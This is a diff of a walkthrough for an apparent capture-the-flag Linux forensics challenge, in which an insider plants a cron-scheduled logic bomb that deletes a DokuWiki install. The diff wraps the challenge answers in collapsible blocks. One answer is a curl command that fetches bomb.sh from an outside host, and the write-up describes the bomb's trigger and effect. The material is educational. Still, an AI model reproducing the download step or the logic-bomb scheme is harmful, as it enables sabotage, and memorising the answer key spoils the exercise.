@@ -35,9 +35,10 @@ If we're looking for privileged commands, the best places to check are `bash_his
 
 To filter out commands from auth.log, we can run `grep COMMAND /var/log/auth.log`. This helps us see what was run with elevated privileges. Looking at the logs, it turns out the "cybert" user installed **DokuWiki** using `apt` with `sudo`.
 
-```
-/usr/bin/apt install dokuwiki
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/usr/bin/apt install dokuwiki</code></pre>
+</details>
 
 >What was the present working directory (PWD) when the previous command was run?
 
@@ -45,9 +46,10 @@ To filter out commands from auth.log, we can run `grep COMMAND /var/log/auth.log
 
 We can see that most commands are executed from home directory of "cybert" user including the previous command we found as well.
 
-```
-/home/cybert
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/home/cybert</code></pre>
+</details>
 
 ***
 ## Let’s see if you did anything bad
@@ -59,9 +61,10 @@ We can see that most commands are executed from home directory of "cybert" user 
 
 After installed DokuWiki, user then created another user "it-admin" with `sudo`
 
-```
-it-admin
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>it-admin</code></pre>
+</details>
 
 >A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
 
@@ -73,9 +76,10 @@ Notice that `visudo` was used and then "it-admin" was found to executed command 
 
 To match the timeline from the audit log, we can use `stat /etc/sudoers` to display statistic of a file which included Access, Modify and Change timestamp as well and as we can see from the above image, the modify and change timestamp matches the timestamp of `visudo` binary usage in audit log.
 
-```
-Dec 28 06:27:34
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Dec 28 06:27:34</code></pre>
+</details>
 
 >A script file was opened using the "vi" text editor. What is the name of this file?
 
@@ -83,9 +87,11 @@ Dec 28 06:27:34
 
 Then after that, we can see that "it-admin" user used `vi` to edit `bomb.sh` file.
 
-```
-bomb.sh
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>bomb.sh</code></pre>
+</details>
+
 * * *
 ## Bomb has been planted. But when and where?
 **That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.**
@@ -96,9 +102,10 @@ bomb.sh
 
 Upon accessing "it-admin" user's home directory, `bomb.sh` was nowhere to be found so we have to inspect `.bash_history` to find out what happened and it turns out, the file was not newly created on this machine but fetched from other server using `curl` but we could also see that "it-admin" removed `bomb.sh` later which is the reason why we could not find this file on this user's home directory
 
-```
-curl 10.10.158.38:8080/bomb.sh --output bomb.sh
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>curl 10.10.158.38:8080/bomb.sh --output bomb.sh</code></pre>
+</details>
 
 >The file was renamed and moved to a different directory. What is the full path of this file now?
 
@@ -106,9 +113,10 @@ curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 
 Since we know that user use `vi` to edit file then we can inspect `.viminfo` file for any history related to `vi` and we can see that the file was saved as `/bin/os-update.sh`. 
 
-```
-/bin/os-update.sh
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>/bin/os-update.sh</code></pre>
+</details>
 
 >When was the file from the previous question last modified? (Format: Month Day HH:MM)
 
@@ -116,9 +124,10 @@ Since we know that user use `vi` to edit file then we can inspect `.viminfo` fil
 
 We could copy UNIX timestamp from `.viminfo` and convert it but lets just use `stat /bin/os-update.sh` since its a lot easier which we can see that upon saving this file, there is no modification on this file after that.
 
-```
-Dec 28 06:29
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>Dec 28 06:29</code></pre>
+</details>
 
 >What is the name of the file that will get created when the file from the first question executes?
 
@@ -126,9 +135,11 @@ Dec 28 06:29
 
 Lets see what's inside this file, and It appears to be a logic bomb to remove dokuwiki installation directory if "it-admin" user hasn't logged in in the last 90 days and will also create a file with taunting message after the deletion.
 
-```
-goodbye.txt
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>goodbye.txt</code></pre>
+</details>
+
 * * *
 ## Following the fuse
 **So we have a file and a motive. The question we now have is: how will this file be executed?**
@@ -145,9 +156,10 @@ From bash history file, we found that user also use nano to edit `/etc/crontab` 
 
 By inspecting the file, we can see that the logic bomb script is set to  execute at 08:00 AM everyday.
 
-```
-08:00 AM
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>08:00 AM</code></pre>
+</details>
 
 ![8224f9be9ee9d6849e876d2dcaecbcc6.png](/resources/8224f9be9ee9d6849e876d2dcaecbcc6.png)
 
